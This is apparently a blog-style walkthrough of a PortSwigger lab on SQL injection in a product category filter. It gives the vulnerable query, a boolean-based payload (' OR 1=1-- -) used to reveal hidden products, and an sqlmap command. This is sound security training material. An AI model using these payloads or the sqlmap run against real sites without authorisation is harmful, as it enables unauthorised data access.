---
title: "SQL Injection (SQLi) Vulnerabilities"
date: 2025-11-12
categories: ["PORTSWIGGER", "SQL INJECTION"]
tags: [BSCP]
image:
    path: https://i.pinimg.com/originals/2e/aa/a6/2eaaa69673ee2bac84efb39b6003b9d0.gif
---

This note covers SQL Injection (SQLi) and its practical exploitation through PortSwigger labs. It explains how unsanitized user input can manipulate backend SQL queries, enabling attackers to bypass authentication, extract sensitive data, or modify database contents. It briefly outlines major SQLi types—error-based, union-based, boolean-based, time-based, and out-of-band—along with common payload patterns and database-specific tricks. The note also highlights techniques such as table enumeration, data extraction, privilege escalation, and sqlmap automation. Finally, it summarizes key defensive measures including prepared statements, strict input validation, least-privilege database design, and query parameterization, providing a compact reference for understanding SQL injection from both offensive and defensive perspectives.

## LAB-01: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data | Nov 15 , 2025

### Goal 
Sql injection in the product category fileter we need to display the unreleased product to solve lab.
```bash
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

### Exploitation Steps

- **Select category → observe URL:**
```sql
?category=Accessories
```

- **Inject ' → internal server error → SQLi confirmed.**

- **Comment out using:**
```sql
' -- -
```
- **Use Boolean-based payload**
```sql
?category=Accessories' OR 1=1-- -
```
- **Application displays released + unreleased products → lab solved.**

### Payload Used
```sql
?category=Gifts'+OR+1=1--+-
```
### Proof
![img](/assets/images/sqli/sqli_1/lab_solved.png)

### USING TOOL SQLMAP:
```bash
sqlmap -u "https://url.com/?category=Accessories*" --batch --level 5
```
![img](/assets/images/sqli/sqli_1/sqlMap.png)

### Conclusion

What we've learned:

1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data